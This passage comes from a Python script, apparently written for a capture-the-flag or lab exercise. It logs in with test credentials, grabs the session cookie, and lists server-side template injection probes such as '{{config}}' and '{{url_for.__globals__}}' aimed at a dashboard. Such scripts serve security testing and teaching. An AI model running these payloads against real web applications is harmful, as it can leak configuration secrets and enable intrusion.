}

# Get a valid session via login
print("[+] Getting valid session via login...")
resp1 = requests.post(base_url + "/", data={"username": "test"}, headers=headers, allow_redirects=False)
password_url = base_url + resp1.headers.get('location', '')
resp2 = requests.post(password_url, data={"username": "test", "user_id": "10032", "password": "test"}, 
                      headers=headers, allow_redirects=False)

# Extract the new valid cookie
session_cookie = None
if 'set-cookie' in resp2.headers:
    cookie_str = resp2.headers['set-cookie']
    match = requests.utils.dict_from_cookiejar(resp2.cookies)
    session_cookie = resp2.cookies.get('session')
    print(f"[+] Valid session cookie: {session_cookie}")

# Now test SSTI on the dashboard with the valid session
print("\n[+] Testing SSTI on dashboard with valid session...")

ssti_payloads = [
    '{{7*7}}',
    '{{7*8}}',
    "{{'7'*7}}",
    '{{config}}',
    '{{self.__dict__}}',
    '{{request.__dict__}}',
    '{{session.__dict__}}',
    '{{url_for.__globals__}}',
    '{{get_flashed_messages.__globals__}}',
]

for payload in ssti_payloads:
